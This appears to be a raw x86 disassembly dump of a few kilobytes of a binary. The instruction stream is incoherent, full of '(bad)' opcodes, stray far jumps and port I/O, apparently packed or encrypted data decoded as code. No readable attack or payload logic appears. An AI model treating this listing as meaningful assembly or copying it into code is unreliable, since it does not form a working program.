  41dc64:	push   es
  41dc65:	clc    
  41dc66:	rol    DWORD PTR fs:0x4f54cddc,cl
  41dc6d:	(bad)  
  41dc6e:	pop    eax
  41dc6f:	sub    BYTE PTR [esi+ebp*2],dl
  41dc72:	jp     0x41dcd7
  41dc74:	mov    eax,0xb972b7c2
  41dc79:	retf   
  41dc7a:	jp     0x41dc4f
  41dc7c:	inc    esi
  41dc7d:	mov    edi,esp
  41dc7f:	aas    
  41dc80:	je     0x41dc42
  41dc82:	gs ins DWORD PTR es:[edi],dx
  41dc84:	dec    ebx
  41dc85:	and    al,0x32
  41dc87:	mov    eax,0xba2f1c59
  41dc8c:	fstp   DWORD PTR [eax+edi*8-0x71c17b06]
  41dc93:	pop    ecx
  41dc94:	mov    ds,WORD PTR [ebp+ebx*2+0x43]
  41dc98:	cli    
  41dc99:	mov    ecx,0x7e06c867
  41dc9e:	fldcw  WORD PTR [eax]
  41dca0:	(bad)  
  41dca1:	data16 xor BYTE PTR [edx],0x94
  41dca5:	lea    ecx,[ebx]
  41dca7:	jp     0x41dc4d
  41dca9:	sub    BYTE PTR [eax+edi*8-0x72],ah
  41dcad:	push   edx
  41dcae:	xlat   BYTE PTR ds:[ebx]
  41dcaf:	mov    dl,0x99
  41dcb1:	push   ss
  41dcb2:	mov    ch,0x31
  41dcb4:	dec    ecx
  41dcb5:	shl    DWORD PTR [edi],1
  41dcb7:	mov    ds:0x9c07acf6,al
  41dcbc:	js     0x41dc6a
  41dcbe:	adc    DWORD PTR [eax],ebp
  41dcc0:	(bad)  
  41dcc1:	jmp    0xca13:0x7d55afac
  41dcc8:	inc    edi
  41dcc9:	and    BYTE PTR [edi+0x19c3c13c],bl
  41dccf:	test   BYTE PTR [edx+0x2b6a48e4],ah
  41dcd5:	std    
  41dcd6:	sbb    al,0x68
  41dcd8:	inc    esp
  41dcd9:	call   0xb0a03b1f
  41dcde:	call   0x517f9159
  41dce3:	jg     0x41dce0
  41dce5:	scas   eax,DWORD PTR es:[edi]
  41dce6:	xor    BYTE PTR [eax],0xd4
  41dce9:	je     0x41dd20
  41dceb:	outs   dx,BYTE PTR ds:[esi]
  41dcec:	dec    eax
  41dced:	or     DWORD PTR [eax+0x12],esp
  41dcf0:	scas   eax,DWORD PTR es:[edi]
  41dcf1:	daa    
  41dcf2:	mov    ch,0x8c
  41dcf4:	aaa    
  41dcf5:	adc    bl,ah
  41dcf7:	fs out 0xbb,al
  41dcfa:	xchg   ebp,eax
  41dcfb:	adc    al,BYTE PTR [ecx+0x33]
  41dcfe:	xchg   esp,eax
  41dcff:	add    DWORD PTR [esi],edi
  41dd01:	cmc    
  41dd02:	fs mov dh,0xa7
  41dd05:	jno    0x41dd42
  41dd07:	push   ds
  41dd08:	test   BYTE PTR [eax],bh
  41dd0a:	daa    
  41dd0b:	push   ecx
  41dd0c:	jo     0x41dd2f
  41dd0e:	in     eax,0x2e
  41dd10:	xchg   esp,eax
  41dd11:	pop    eax
  41dd12:	call   0x4910c10f
  41dd17:	inc    esi
  41dd18:	adc    eax,0x35370ea6
  41dd1d:	rol    BYTE PTR [ebx+edx*4-0x6f],1
  41dd21:	xor    eax,0xf099449e
  41dd26:	nop
  41dd27:	inc    esi
  41dd28:	shl    ebx,cl
  41dd2a:	fcom   DWORD PTR [edx+0x79b2e4ad]
  41dd30:	(bad)  
  41dd31:	aam    0x22
  41dd33:	jns    0x41dccf
  41dd35:	div    DWORD PTR [eax]
  41dd37:	stc    
  41dd38:	jne    0x41dd00
  41dd3a:	(bad)  
  41dd3c:	pop    ecx
  41dd3d:	sahf   
  41dd3e:	mov    ebx,0xbd953129
  41dd43:	loop   0x41dda1
  41dd45:	xor    dl,BYTE PTR [eax+0x2a]
  41dd48:	ror    BYTE PTR [ebx-0x5e],0x3c
  41dd4c:	jle    0x41dd4b
  41dd4e:	and    bh,BYTE PTR [edi+edx*1]
  41dd51:	inc    esi
  41dd52:	or     DWORD PTR [ebx+0x3c],0x40bb2565
  41dd59:	pop    esp
  41dd5a:	int3   
  41dd5b:	inc    ebp
  41dd5c:	(bad)  
  41dd5d:	ins    DWORD PTR es:[edi],dx
  41dd5e:	imul   esi,DWORD PTR [eax-0x2d33acb7],0xd486991f
  41dd68:	repz push ebp
  41dd6a:	cmp    al,0xa8
  41dd6c:	inc    edx
  41dd6d:	dec    ebp
  41dd6e:	add    eax,0x75ae7e65
  41dd73:	pop    edx
  41dd74:	xchg   esp,eax
  41dd75:	pop    eax
  41dd76:	mov    ch,0x8e
  41dd78:	pop    es
  41dd79:	stc    
  41dd7a:	jne    0x41ddd1
  41dd7c:	out    0x5e,al
  41dd7e:	les    esi,FWORD PTR [esi-0x1e5f1900]
  41dd84:	push   cs
  41dd85:	sbb    BYTE PTR ds:0x66606d61,ch
  41dd8b:	and    ebx,ebp
  41dd8d:	jne    0x41dd73
  41dd8f:	cld    
  41dd90:	in     eax,0xa1
  41dd92:	push   edi
  41dd93:	cld    
  41dd94:	enter  0x8cc5,0x76
  41dd98:	das    
  41dd99:	dec    ecx
  41dd9a:	cwde   
  41dd9b:	cld    
  41dd9c:	xor    edi,DWORD PTR ss:[esi+0x6b81c6a5]
  41dda3:	jno    0x41dd55
  41dda5:	shl    DWORD PTR [esi+ebx*1],0xd6
  41dda9:	retf   0x2077
  41ddac:	pop    edx
  41ddad:	pop    esi
  41ddae:	inc    edx
  41ddaf:	sbb    bl,dh
  41ddb1:	mov    cl,0xdf
  41ddb3:	fwait
  41ddb4:	cmp    BYTE PTR [ecx-0x1718730c],cl
  41ddba:	adc    DWORD PTR [esi-0x2b3daeed],esp
  41ddc0:	pop    edx
  41ddc1:	test   eax,0xe55014d1
  41ddc6:	jle    0x41dd4d
  41ddc8:	lock xlat BYTE PTR ds:[ebx]
  41ddca:	dec    BYTE PTR [ebp+0x68]
  41ddcd:	and    BYTE PTR [edi+0x62],cl
  41ddd0:	push   edx
  41ddd1:	push   edx
  41ddd2:	jg     0x41de4a
  41ddd4:	das    
  41ddd5:	jne    0x41ddb7
  41ddd7:	xchg   ebx,eax
  41ddd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddd9:	fwait
  41ddda:	mov    bh,0xe5
  41dddc:	repz or eax,0x8f0ac627
  41dde2:	jmp    0xb16477ba
  41dde7:	inc    eax
  41dde8:	cdq    
  41dde9:	sbb    al,0x30
  41ddeb:	sahf   
  41ddec:	(bad)  
  41dded:	aam    0xf7
  41ddef:	xor    bl,ah
  41ddf1:	xchg   BYTE PTR [eax+eax*2-0x67],bh
  41ddf5:	add    DWORD PTR [esi],edi
  41ddf7:	jae    0x41de50
  41ddf9:	push   esi
  41ddfa:	jle    0x41ddfe
  41ddfc:	retf   0x3ff7
  41ddff:	loope  0x41de63
  41de01:	mov    ss,WORD PTR [ebp+0xed5ac5a]
  41de07:	inc    edi
  41de08:	adc    al,0xa2
  41de0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de0b:	rcl    DWORD PTR [esi-0x149a7078],0x0
  41de12:	sbb    bh,dl
  41de14:	add    edx,ebx
  41de16:	lds    edi,FWORD PTR [ebx+0x2a419cc7]
  41de1c:	test   eax,0x13812b25
  41de21:	jle    0x41de6a
  41de23:	in     al,0x9a
  41de25:	push   ecx
  41de26:	cwde   
  41de27:	fsubr  DWORD PTR [ebp-0x5c]
  41de2a:	lea    ebx,[ebx+0x4e]
  41de2d:	push   esp
  41de2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de2f:	loopne 0x41de51
  41de31:	imul   ecx,esp,0x71
  41de34:	(bad)  
  41de35:	clc    
  41de36:	in     al,dx
  41de37:	repnz retf 
  41de39:	cmp    edx,DWORD PTR [ecx]
  41de3b:	test   al,0x8e
  41de3d:	leave  
  41de3e:	mov    fs:0xea609e15,al
  41de44:	mov    edx,0xbe8a3ee7
  41de49:	adc    al,0x6f
  41de4b:	outs   dx,BYTE PTR ds:[esi]
  41de4c:	ror    DWORD PTR [ecx+0x7c8d3a4a],1
  41de52:	cmp    ecx,DWORD PTR [ebx+0x6b]
  41de55:	inc    ebp
  41de56:	fld    st(4)
  41de58:	cdq    
  41de59:	arpl   WORD PTR [edi+ecx*8],si
  41de5c:	mov    dh,0xc0
  41de5e:	gs shr DWORD PTR gs:[edi+0x3ef1b859],cl
  41de66:	mov    bh,0x43
  41de68:	mov    edx,0x6d2abef0
  41de6d:	dec    ebx
  41de6e:	ins    BYTE PTR es:[edi],dx
  41de6f:	nop
  41de70:	outs   dx,BYTE PTR ds:[esi]
  41de71:	or     dl,BYTE PTR [eax]
  41de73:	or     BYTE PTR [esi+esi*8+0xf],ch
  41de77:	cmp    eax,0xc987b923
  41de7c:	mov    al,ds:0xa879bfa9
  41de81:	xchg   edi,eax
  41de82:	xchg   esi,eax
  41de83:	out    dx,eax
  41de84:	add    ch,BYTE PTR [eax]
  41de86:	enter  0xf047,0x53
  41de8a:	mov    eax,0x641a92db
  41de8f:	mov    dh,0xca
  41de91:	sub    bl,ch
  41de93:	pop    edi
  41de94:	aam    0x68
  41de96:	(bad)  
  41de97:	mov    WORD PTR [ebx-0x3a],?
  41de9a:	psllq  mm7,QWORD PTR [edx+0x6e]
  41de9e:	bound  edx,QWORD PTR [ebp+0x79302d8]
  41dea4:	scas   al,BYTE PTR es:[edi]
  41dea5:	iret   
  41dea6:	xor    edi,DWORD PTR [eax]
  41dea8:	loopne 0x41de4f
  41deaa:	cmp    BYTE PTR [eax],0x71
  41dead:	or     esi,DWORD PTR [ebx-0x5e]
  41deb0:	mov    WORD PTR [edi],ss
  41deb2:	int3   
  41deb3:	xchg   edx,eax
  41deb4:	sbb    cl,bh
  41deb6:	sbb    edx,edx
  41deb8:	pop    edx
  41deb9:	xlat   BYTE PTR ds:[ebx]
  41deba:	jg     0x41de5e
  41debc:	sub    al,0x5e
  41debe:	in     eax,0xbc
  41dec0:	push   ebp
  41dec1:	ins    DWORD PTR es:[edi],dx
  41dec2:	cmp    DWORD PTR [edx+edx*2-0x69],esp
  41dec6:	push   ds
  41dec7:	in     al,0x79
  41dec9:	cmc    
  41deca:	push   esp
  41decb:	adc    DWORD PTR [edi],ebx
  41decd:	loopne 0x41deaa
  41decf:	cmp    bh,BYTE PTR [ebp-0x230818f6]
  41ded5:	frstor [esi]
  41ded7:	xchg   esi,eax
  41ded8:	cmp    DWORD PTR [edi-0xd],esi
  41dedb:	or     al,0xf8
  41dedd:	cli    
  41dede:	sub    ebp,DWORD PTR [ebx]
  41dee0:	mov    BYTE PTR [esi+0x7d],bh
  41dee3:	push   ebx
  41dee4:	scas   eax,DWORD PTR es:[edi]
  41dee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dee6:	test   al,0x2d
  41dee8:	in     eax,dx
  41dee9:	and    bl,0xe2
  41deec:	cmc    
  41deed:	nop
  41deee:	es cmp eax,0x2a3dadd7
  41def4:	mov    eax,cs:0x6abe744f
  41defa:	les    ebx,FWORD PTR [eax]
  41defc:	pop    esp
  41defd:	dec    eax
  41defe:	pop    es
  41deff:	fbld   TBYTE PTR [ecx]
  41df01:	push   esp
  41df02:	in     eax,0x1
  41df04:	popf   
  41df05:	adc    edi,DWORD PTR [ebp-0x5ffa6626]
  41df0b:	(bad)  
  41df0c:	ficom  WORD PTR [ebx]
  41df0e:	mov    ebp,0x202e532c
  41df13:	xchg   edi,eax
  41df14:	jmp    0x2ab232be
  41df19:	mov    ah,0x1c
  41df1b:	jno    0x41df06
  41df1d:	loopne 0x41deb0
  41df1f:	push   esp
  41df20:	ret    0xaefd
  41df23:	sahf   
  41df24:	xor    DWORD PTR [ebx],eax
  41df26:	pop    ds
  41df27:	int    0xef
  41df29:	iret   
  41df2a:	dec    edx
  41df2b:	aas    
  41df2c:	add    al,0xf9
  41df2e:	dec    edx
  41df2f:	mov    ebp,0x6ed6da90
  41df34:	pop    esp
  41df35:	lods   eax,DWORD PTR ds:[esi]
  41df36:	addr16 jnp 0x41df3f
  41df39:	ja     0x41df28
  41df3b:	adc    edi,ecx
  41df3d:	int3   
  41df3e:	add    DWORD PTR [edx],ecx
  41df40:	and    cl,BYTE PTR [ebx]
  41df42:	dec    ebp
  41df43:	dec    ebx
  41df44:	adc    eax,0x40343505
  41df49:	jo     0x41dfa4
  41df4b:	mov    edx,DWORD PTR [edi-0x5]
  41df4e:	jmp    0x41df3e
  41df50:	xor    ebp,DWORD PTR [ebx]
  41df52:	jo     0x41defc
  41df54:	inc    edx
  41df55:	add    al,0xc2
  41df57:	(bad)  
  41df58:	clc    
  41df59:	icebp  
  41df5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df5b:	es dec esi
  41df5d:	hlt    
  41df5e:	and    eax,0x6439fe6f
  41df63:	cmp    al,0x72
  41df65:	fmul   DWORD PTR [edi-0x6]
  41df68:	fdiv   QWORD PTR [ebx*2-0x1eecc59d]
  41df6f:	fistp  DWORD PTR [ecx]
  41df71:	shl    esp,cl
  41df73:	dec    edi
  41df74:	js     0x41df2a
  41df76:	push   ecx
  41df77:	dec    esi
  41df78:	xchg   ecx,eax
  41df79:	sbb    al,0x75
  41df7b:	pop    ebp
  41df7c:	imul   eax,ebx,0x2761ec6a
  41df82:	or     cl,BYTE PTR [ebx-0xf402994]
  41df88:	mov    cl,0x46
  41df8a:	xor    cl,bh
  41df8c:	push   0xffffffee
  41df8e:	clc    
  41df8f:	jg     0x41df3b
  41df91:	stos   DWORD PTR es:[edi],eax
  41df92:	or     cl,BYTE PTR [ebx-0x2d0fb2c2]
  41df98:	retf   
  41df99:	repz mov ah,0x4a
  41df9c:	xchg   BYTE PTR [esi-0x2a6da349],bh
  41dfa2:	jmp    0x2f5ff1f3
  41dfa7:	dec    edx
  41dfa8:	out    dx,al
  41dfa9:	add    BYTE PTR [eax+0x5c],0xae
  41dfad:	sti    
  41dfae:	push   es
  41dfaf:	aam    0xa2
  41dfb1:	inc    esi
  41dfb2:	inc    ebx
  41dfb3:	scas   eax,DWORD PTR es:[edi]
  41dfb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfb5:	cmp    edi,DWORD PTR [esi+0x46622032]
  41dfbb:	sub    BYTE PTR [ebx],0x3a
  41dfbe:	mov    dh,0x85
  41dfc0:	dec    eax
  41dfc1:	(bad)  
  41dfc2:	ds mov eax,0xd88a3416
  41dfc8:	fadd   DWORD PTR [ecx+0x57a07a2b]
  41dfce:	mov    ch,0x95
  41dfd0:	in     al,0x33
  41dfd2:	outs   dx,DWORD PTR ds:[esi]
  41dfd3:	mov    edx,0x4e6e8b55
  41dfd8:	cmc    
  41dfd9:	mov    cl,0x81
  41dfdb:	aam    0xfb
  41dfdd:	jae    0x41dfd0
  41dfdf:	lock pop es
  41dfe1:	mov    cl,0xa
  41dfe3:	ins    DWORD PTR es:[edi],dx
  41dfe4:	push   ds
  41dfe5:	add    ah,BYTE PTR [ebp+0x5f]
  41dfe8:	sub    BYTE PTR [ebp+0x72],dl
  41dfeb:	or     al,0x57
  41dfed:	enter  0x2c5b,0x9e
  41dff1:	jmp    0xc6350e1e
  41dff6:	sub    eax,esp
  41dff8:	gs out 0x7a,al
  41dffb:	(bad)  
  41dffd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dffe:	loopne 0x41dfe0
  41e000:	jg     0x41dfb1
  41e002:	xchg   edi,eax
  41e003:	mov    al,0x79
  41e005:	fsub   DWORD PTR [esi+0x7c65c14a]
  41e00b:	sahf   
  41e00c:	loop   0x41e086
  41e00e:	adc    ch,BYTE PTR es:[edx-0x4b]
  41e012:	test   eax,0x89dababb
  41e017:	pop    eax
  41e018:	retf   0x7069
  41e01b:	(bad)  
  41e01c:	lock cmp BYTE PTR [ebx+0x54],cl
  41e020:	mov    esi,0x95d2a275
  41e025:	mov    dl,0xbd
  41e027:	lods   al,BYTE PTR ds:[esi]
  41e028:	cmovg  esp,DWORD PTR [eax-0x267edbac]
  41e02f:	push   ebp
  41e030:	jb     0x41dfb3
  41e032:	sti    
  41e033:	fwait
  41e034:	push   0xbadbe2c6
  41e039:	adc    dl,BYTE PTR [edx]
  41e03b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e03c:	das    
  41e03d:	add    eax,0xa74e9dda
  41e042:	stos   BYTE PTR es:[edi],al
  41e043:	xor    BYTE PTR [esi+0xc067eab],0x30
  41e04a:	pusha  
  41e04b:	add    al,0xfd
  41e04d:	sbb    al,0x14
  41e04f:	rcl    DWORD PTR [esi],cl
  41e051:	push   ebp
  41e052:	dec    edx
  41e053:	bound  ecx,QWORD PTR [edx+0x53]
  41e056:	cmp    DWORD PTR [edx],edx
  41e058:	test   BYTE PTR [esi-0x2a],bh
  41e05b:	add    DWORD PTR [edx-0x26],esp
  41e05e:	or     eax,DWORD PTR [esi+0x2e]
  41e061:	push   ebp
  41e062:	enter  0xa43d,0x6c
  41e066:	iret   
  41e067:	test   BYTE PTR [edx],al
  41e069:	mov    ah,0x1d
  41e06b:	pushf  
  41e06c:	xchg   BYTE PTR [ecx],dh
  41e06e:	sbb    al,bl
  41e070:	pop    ebx
  41e071:	sbb    DWORD PTR [ecx+ebx*1-0x1e],ebx
  41e075:	ins    BYTE PTR es:[edi],dx
  41e076:	inc    ebx
  41e077:	xchg   esi,eax
  41e078:	xor    edi,DWORD PTR [eax+0x47]
  41e07b:	loope  0x41e0f5
  41e07d:	pop    ebp
  41e07e:	lods   al,BYTE PTR ds:[esi]
  41e07f:	pop    ds
  41e080:	rcr    ebp,1
  41e082:	or     BYTE PTR [ebx-0x75],dh
  41e085:	push   eax
  41e086:	cmp    bh,ch
  41e088:	shr    DWORD PTR [edx],1
  41e08a:	sub    DWORD PTR [esi-0x35],ebx
  41e08d:	je     0x41e07e
  41e08f:	ins    BYTE PTR es:[edi],dx
  41e090:	test   eax,0x798be46f
  41e095:	lods   al,BYTE PTR ds:[esi]
  41e096:	sub    DWORD PTR [ebp+edx*4-0x5ceb7df8],0xe
  41e09e:	mov    eax,es:0x5eae7ad3
  41e0a4:	mov    ecx,gs
  41e0a6:	pop    edi
  41e0a7:	mov    ds:0x480fd23,eax
  41e0ac:	mov    esi,0x23e944bd
  41e0b1:	jmp    0x41e0a5
  41e0b3:	(bad)  
  41e0b4:	hlt    
  41e0b5:	pop    ss
  41e0b6:	aam    0xb6
  41e0b8:	mov    ds:0xe96a1529,eax
  41e0bd:	xchg   edx,eax
  41e0be:	mov    ch,0x76
  41e0c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0c1:	xlat   BYTE PTR ds:[ebx]
  41e0c2:	popf   
  41e0c3:	ins    BYTE PTR es:[edi],dx
  41e0c4:	mov    ecx,0x3f8de1af
  41e0c9:	loopne 0x41e120
  41e0cb:	cmp    eax,0xe27aae42
  41e0d0:	push   ebp
  41e0d1:	fbstp  TBYTE PTR [edx-0x5059c30d]
  41e0d7:	jle    0x41e07e
  41e0d9:	jo     0x41e0c1
  41e0db:	shl    esi,0xfa
  41e0de:	in     eax,0xd
  41e0e0:	push   cs
  41e0e1:	aaa    
  41e0e2:	lds    edx,FWORD PTR [eax]
  41e0e4:	xchg   ecx,eax
  41e0e5:	std    
  41e0e6:	push   esp
  41e0e7:	outs   dx,BYTE PTR ds:[esi]
  41e0e8:	(bad)
  41e0eb:	push   0x40127f7b
  41e0f0:	xchg   esi,eax
  41e0f1:	cmp    bl,dl
  41e0f3:	dec    ebx
  41e0f4:	int3   
  41e0f5:	push   es
  41e0f6:	push   0xffffffd4
  41e0f8:	mov    al,ds:0xe0a04f46
  41e0fd:	ret    0x3259
  41e100:	out    dx,al
  41e101:	(bad)  [edx-0x7450915e]
  41e107:	ret    
  41e108:	and    DWORD PTR [esi-0x16cf2a70],esp
  41e10e:	aad    0xff
  41e110:	xchg   esi,eax
  41e111:	push   ebx
  41e112:	loop   0x41e185
  41e114:	push   0xf1ef92ed
  41e119:	push   edi
  41e11a:	push   ebx
  41e11b:	pop    es
  41e11c:	and    BYTE PTR ds:0xfff69a79,dh
  41e122:	xor    DWORD PTR [ebp+0x41404c1e],ebp
  41e128:	jmp    0x41e0eb
  41e12a:	cmp    edi,0x4
  41e12d:	cdq    
  41e12e:	jbe    0x41e197
  41e130:	test   esp,eax
  41e132:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e133:	sbb    edx,DWORD PTR [esi-0x33735a6]
  41e139:	hlt    
  41e13a:	push   esi
  41e13b:	inc    esp
  41e13c:	aaa    
  41e13d:	mov    ecx,ecx
  41e13f:	or     al,al
  41e141:	fnstsw WORD PTR [eax+0x68]
  41e144:	leave  
  41e145:	jns    0x41e162
  41e147:	jbe    0x41e12a
  41e149:	outs   dx,BYTE PTR ds:[esi]
  41e14a:	ja     0x41e179
  41e14c:	test   BYTE PTR [eax+0x89bdb64],dh
  41e152:	pushf  
  41e153:	int3   
  41e154:	(bad)  
  41e155:	fdiv   DWORD PTR [ecx+0x7345cefa]
  41e15b:	push   0xb4872911
  41e160:	pop    edx
  41e161:	and    dl,bh
  41e163:	push   ebp
  41e164:	inc    esi
  41e165:	pop    edi
  41e166:	stos   BYTE PTR es:[edi],al
  41e167:	push   eax
  41e168:	stos   DWORD PTR es:[di],eax
  41e16a:	dec    edi
  41e16b:	xchg   BYTE PTR [ecx+ebx*2-0x3bdacdcd],dh
  41e172:	sub    ebx,DWORD PTR [ebp+edx*8-0x4a8d0cb7]
  41e179:	or     BYTE PTR [ecx-0x22],cl
  41e17c:	pop    ebp
  41e17d:	mov    ebx,0x64e671d7
  41e182:	adc    DWORD PTR [edi],ecx
  41e184:	dec    edi
  41e185:	das    
  41e186:	pop    edx
  41e187:	cmp    ebx,DWORD PTR [edx-0x5f01dee1]
  41e18d:	dec    eax
  41e18e:	and    eax,0xf729ba27
  41e193:	cli    
  41e194:	int    0x9b
  41e196:	or     eax,0xb8412ef7
  41e19b:	adc    al,0xe9
  41e19d:	sar    BYTE PTR [eax-0xc60207b],0x35
  41e1a4:	jecxz  0x41e1b4
  41e1a6:	ins    DWORD PTR es:[edi],dx
  41e1a7:	mov    esp,0x4c61af95
  41e1ac:	inc    esi
  41e1ad:	mov    bl,0xe3
  41e1af:	lock js 0x41e184
  41e1b2:	inc    edx
  41e1b3:	(bad)
  41e1b7:	sbb    al,0x1e
  41e1b9:	mov    edi,DWORD PTR [eax-0x3]
  41e1bc:	add    al,0x1a
  41e1be:	mov    bl,BYTE PTR [edx]
  41e1c0:	ins    DWORD PTR es:[edi],dx
  41e1c1:	sbb    al,0xdd
  41e1c3:	stc    
  41e1c4:	xchg   esi,eax
  41e1c5:	mov    bl,0xda
  41e1c7:	test   eax,0x4d3ae7b1
  41e1cc:	xchg   edx,eax
  41e1cd:	div    BYTE PTR [ebx+0x63]
  41e1d0:	scas   eax,DWORD PTR es:[edi]
  41e1d1:	daa    
  41e1d2:	ror    dl,0xcf
  41e1d5:	jge    0x41e1e1
  41e1d7:	pop    ebp
  41e1d8:	jecxz  0x41e209
  41e1da:	leave  
  41e1db:	mov    bl,0xb6
  41e1dd:	adc    al,0x6d
  41e1df:	sub    ah,dl
  41e1e1:	arpl   si,sp
  41e1e3:	mov    esp,0x705ce449
  41e1e8:	loope  0x41e23e
  41e1ea:	in     al,dx
  41e1eb:	and    BYTE PTR [ebx+ecx*1],dh
  41e1ee:	jg     0x41e1ac
  41e1f0:	sar    BYTE PTR [ebx+0x238fe681],0xaf
  41e1f7:	data16 xor ch,BYTE PTR [ebp+0x45]
  41e1fb:	or     al,0x8
  41e1fd:	mov    eax,ds:0x400af41a
  41e202:	out    0x25,al
  41e204:	mov    ds:0x7683a687,al
  41e209:	(bad)  
  41e20a:	fisubr WORD PTR [edi]
  41e20c:	outs   dx,BYTE PTR ds:[esi]
  41e20d:	fnstenv [esi]
  41e20f:	sub    DWORD PTR [edi-0x57750ebf],edi
  41e215:	push   edi
  41e216:	pop    ss
  41e217:	cmp    al,0xca
  41e219:	js     0x41e231
  41e21b:	jl     0x41e1ee
  41e21d:	jno    0x41e1a9
  41e21f:	push   edi
  41e220:	sub    DWORD PTR [ecx],eax
  41e222:	pop    ecx
  41e223:	sbb    ebx,ecx
  41e225:	int3   
  41e226:	xchg   BYTE PTR [eax],bh
  41e228:	sub    eax,0x310e2716
  41e22d:	jb     0x41e1f0
  41e22f:	loope  0x41e1da
  41e231:	(bad)  
  41e232:	je     0x41e287
  41e234:	fisttp QWORD PTR [edx-0x4a96b771]
  41e23a:	pop    edx
  41e23b:	xchg   edi,eax
  41e23c:	cmp    BYTE PTR [esi+0x76c6f8f],ch
  41e242:	(bad)  
  41e243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e244:	mov    dh,0x78
  41e246:	push   0x3
  41e248:	mov    dl,0xb9
  41e24a:	push   esp
  41e24b:	in     al,0x69
  41e24d:	test   eax,0x9ec8bb00
  41e252:	frstor [ebp+0x57c7959b]
  41e258:	out    dx,al
  41e259:	(bad)  
  41e25a:	shl    dh,cl
  41e25c:	mov    cl,cl
  41e25e:	pop    esi
  41e25f:	rcr    BYTE PTR [edi-0x57],cl
  41e262:	push   es
  41e263:	(bad)  
  41e264:	sbb    DWORD PTR [eax],edi
  41e266:	push   ecx
  41e267:	cmp    BYTE PTR [ebp-0x18],0x8d
  41e26b:	loope  0x41e27e
  41e26d:	pusha  
  41e26e:	mov    ah,0x72
  41e270:	jmp    0x522a:0xe91f3230
  41e277:	arpl   WORD PTR [esi+0x7f36422c],di
  41e27d:	jns    0x41e2b1
  41e27f:	cmp    eax,0x37924bc3
  41e284:	add    esi,esi
  41e286:	pop    es
  41e287:	adc    BYTE PTR [ebp+0x48],ch
  41e28a:	xchg   ecx,eax
  41e28b:	push   es
  41e28c:	sbb    cl,dh
  41e28e:	daa    
  41e28f:	popf   
  41e290:	loope  0x41e21d
  41e292:	test   eax,0x2e7e406b
  41e297:	push   esi
  41e298:	cmp    dh,BYTE PTR [eax]
  41e29a:	mov    ch,0x19
  41e29c:	and    al,0x18
  41e29e:	jmp    0xdd38b670
  41e2a3:	xchg   ecx,eax
  41e2a4:	push   esp
  41e2a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2a6:	cmp    eax,DWORD PTR [edi-0x1c5c6257]
  41e2ac:	(bad)  
  41e2ad:	mov    DWORD PTR [eax],edi
  41e2af:	push   0x0
  41e2b1:	adc    BYTE PTR [edx+0x6c6b223b],0x25
  41e2b8:	pop    esi
  41e2b9:	fcom   DWORD PTR [edx+0x33]
  41e2bc:	xchg   ebx,eax
  41e2bd:	in     al,dx
  41e2be:	popa   
  41e2bf:	das    
  41e2c0:	mov    dh,0x44
  41e2c2:	shr    BYTE PTR [eax+ecx*8-0x1da62491],cl
  41e2c9:	push   esi
  41e2ca:	test   al,0xaa
  41e2cc:	sar    DWORD PTR [ecx+0x51a10eb5],cl
  41e2d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2d3:	(bad)  
  41e2d4:	out    0xa1,al
  41e2d6:	sbb    BYTE PTR [ebx-0x5bcc265d],dh
  41e2dc:	mov    eax,ds:0x74f34ea8
  41e2e1:	aad    0xf4
  41e2e3:	inc    edi
  41e2e4:	fwait
  41e2e5:	push   0xcd41b4d9
  41e2ea:	jo     0x41e2e3
  41e2ec:	inc    edi
  41e2ed:	cmp    BYTE PTR [ebx-0x5e],dl
  41e2f0:	enter  0x6d0,0xef
  41e2f4:	dec    ebx
  41e2f5:	nop
  41e2f6:	mov    bh,0x8f
  41e2f8:	out    0xd0,al
  41e2fa:	sbb    eax,0xaff0c6db
  41e2ff:	mov    ds:0xd04c04f2,al
  41e304:	imul   eax,esi,0xffffffc5
  41e307:	je     0x41e2e7
  41e309:	cwde   
  41e30a:	in     eax,dx
  41e30b:	out    dx,al
  41e30c:	pop    edx
  41e30d:	add    DWORD PTR [edi+0x52b6e48],ebx
  41e313:	and    esi,DWORD PTR [ecx-0x4f]
  41e316:	pop    ds
  41e317:	sahf   
  41e318:	dec    edx
  41e319:	xchg   ecx,eax
  41e31a:	daa    
  41e31b:	cmp    cl,BYTE PTR [esp+ecx*1-0x33]
  41e31f:	cdq    
  41e320:	nop
  41e321:	lea    ecx,[ecx+0x5f321c1e]
  41e327:	jl     0x41e2b1
  41e329:	daa    
  41e32a:	push   0xfffffff8
  41e32c:	mov    ebp,0xbfc8e0d2
  41e331:	add    DWORD PTR [esi+0x72236038],ebp
  41e337:	jb     0x41e361
  41e339:	daa    
  41e33a:	push   ds
  41e33b:	test   BYTE PTR [esi-0x3bb51b2a],bl
  41e341:	adc    DWORD PTR [bx+si-0x6eb0],0xffffff9a
  41e347:	push   ds
  41e348:	pop    esi
  41e349:	push   cs
  41e34a:	or     al,0xb5
  41e34c:	test   cl,0xe8
  41e34f:	test   DWORD PTR [esi+0x5a5a02ec],ebp
  41e355:	call   0xbc2c:0x9b6db6fd
  41e35c:	scas   al,BYTE PTR es:[edi]
  41e35d:	add    BYTE PTR [edx],cl
  41e35f:	in     eax,0xed
  41e361:	pop    esp
  41e362:	mov    edx,0x8c9b1a5f
  41e367:	lea    ebp,[ecx+0x1b]
  41e36a:	call   0x74da:0xab4484ab
  41e371:	shl    DWORD PTR [ebp-0x62],cl
  41e374:	jecxz  0x41e365
  41e376:	scas   al,BYTE PTR es:[edi]
  41e377:	inc    ebp
  41e378:	mov    bl,BYTE PTR [ebp+0x261d5749]
  41e37e:	inc    edx
  41e37f:	popa   
  41e380:	push   ss
  41e381:	repz inc ebx
  41e383:	call   0x9fa3:0x60cb297a
  41e38a:	dec    eax
  41e38b:	sar    BYTE PTR [ebx-0x251409b0],0x39
  41e392:	std    
  41e393:	pop    es
